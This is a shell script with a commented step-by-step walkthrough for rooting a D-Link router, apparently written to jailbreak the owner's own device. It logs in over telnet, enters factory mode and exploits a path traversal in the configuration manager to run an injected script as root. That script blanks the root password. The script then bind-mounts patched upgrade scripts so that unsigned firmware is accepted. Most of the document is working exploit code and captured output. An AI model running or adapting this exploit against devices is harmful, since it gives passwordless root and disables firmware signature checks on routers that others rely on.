#!/bin/ash
#
# script to be executed on router to become root:
# enter into facotry mode with the following commands:
#
# ===== step 1 ======
#valerio@ubuntu-hp:~$ telnet 192.168.1.1
# Trying 192.168.1.1...
# Connected to 192.168.1.1.
# Escape character is '^]'.
# Login: admin
# Password:

# ********************************************
# *                 D-Link                   *
# *                                          *
# *      WARNING: Authorised Access Only     *
# ********************************************

# Welcome
# DLINK# factory
# DLINK(factory)# factory-mode
# DLINK(factory)#
# DLINK(factory)# Connection closed by foreign host.
# ======== end of step 1

# the router reboots and restart in factory mode
# DHCP is disabled so you have to assign a static IP address
# to your PC to connecto to the router using ethernet
# now login again and enter a linux shell with the
# "system shell" command

# ======== step 2 =============
# valerio@ubuntu-hp:~$ telnet 192.168.1.1
# Trying 192.168.1.1...
# Connected to 192.168.1.1.
# Escape character is '^]'.
# Login: admin
# Password:

# ********************************************
# *                 D-Link                   *
# *                                          *
# *      WARNING: Authorised Access Only     *
# ********************************************

# Welcome
# DLINK# system shell


# BusyBox v1.17.3 (2018-04-11 12:29:54 CEST) built-in shell (ash)
# Enter 'help' for a list of built-in commands.

# /root $
# ======== end of step 2 ========

# now execute this script on the target copying it into the /tmp
# folder. You can use scp to copy this script from you Linux PC
# or you can do a simpler copy/paste to a file:
#
# ======== step 3 ===========
# /root $ cat > /tmp/hack-script.sh
#    do a copy and paste of this script
#    press CTRL-D to terminate the copy
#
# /root $ chmod a+x /tmp/hack-script.sh
# /root $ /tmp/hack-script.sh
# copy in /tmp and modify /etc/cm/tr181/dom/Management.xml
# replacing 'Users.sh' with '../../tmp/Users.sh'
# copy in /tmp and modify /etc/ah/Users.sh
# introducig the following line to enabl root without password:
# sed -i 's/^root:\*:0:0:root:/root::0:0:root:/'
# reconfiguring cm with the following command:
# cmclient DOM Device /tmp/Management.xml
# OK
# force excution of /tmp/Users.sh as root with the following command:
# cmclient ADD Device.Users.User
# 4
# Done, now you can become root with the following command:
# su -
# ======= end of step 3 ===========
#
# you can now become root as shown below
#
# ======= step 4
# /root $ su -
#
# BusyBox v1.17.3 (2018-04-11 12:29:54 CEST) built-in shell (ash)
# Enter 'help' for a list of built-in commands.
#  
#  ..................................................................
# root@localhost:~#
# ====== end of step 4	 
#
# --------- copy/paste from the line below --------------------------
#!/bin/ash
echo "copy in /tmp and modify /etc/cm/tr181/dom/Management.xml"
echo "replacing 'Users.sh' with '../../tmp/Users.sh'"
cat /etc/cm/tr181/dom/Management.xml | \
    sed 's/Users.sh/\.\.\/\.\.\/tmp\/Users.sh/g' > /tmp/Management.xml

echo "copy in /tmp and modify /etc/ah/Users.sh"
echo "introducig the following line to enabl root without password:"
echo "  sed -i 's/^root:\*:0:0:root:/root::0:0:root:/'"

cat /etc/ah/Users.sh | \
    sed 's/\#\!\/bin\/sh/\#\!\/bin\/sh\nsed -i "s\/\^root:\\\*:0:0:root:\/root::0:0:root:\/" \/tmp\/passwd/' \
	> /tmp/Users.sh

chmod a+x /tmp/Users.sh

echo "reconfiguring cm with the following command:"
echo "cmclient DOM Device /tmp/Management.xml"

cmclient DOM Device /tmp/Management.xml

echo "force excution of /tmp/Users.sh as root with the following command:"
echo " cmclient ADD Device.Users.User"
cmclient ADD Device.Users.User
echo "Done, now you can become root with the following command:"
echo "su -"

echo "enable, until reboot, upgrade with an unsigned firmware"
cp -p /usr/sbin/upgrade.sh /tmp/upgrade.sh
cat /usr/sbin/upgrade.sh | sed  -r 's/ret_code\=\$\?/ret_code\=0/' > /tmp/upgrade.sh
su -c "mount --bind /tmp/upgrade.sh /usr/sbin/upgrade.sh" -

cp -p /usr/sbin/custom-upgrade-check.sh /tmp/custom-upgrade-check.sh
cat /usr/sbin/custom-upgrade-check.sh | sed 's/^exit 12/\$\(printError "ignoring previous error"\)/' > /tmp/custom-upgrade-check.sh
su -c "mount --bind /tmp/custom-upgrade-check.sh /usr/sbin/custom-upgrade-check.sh" -
